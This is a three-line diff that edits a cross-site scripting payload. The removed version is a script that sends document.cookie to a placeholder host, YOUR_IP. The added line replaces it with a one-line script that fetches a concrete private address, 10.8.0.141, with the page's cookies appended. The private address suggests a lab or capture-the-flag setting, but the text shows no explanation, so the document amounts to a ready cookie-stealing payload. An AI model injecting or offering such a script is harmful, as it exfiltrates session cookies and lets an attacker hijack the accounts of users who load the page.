@@ -1,3 +1,1 @@
-<script>
-  fetch("http://YOUR_IP/." + "session=" + ENCODE(document.cookie))
-</script>
+<script>fetch("http://10.8.0.141/." + document.cookie)</script>
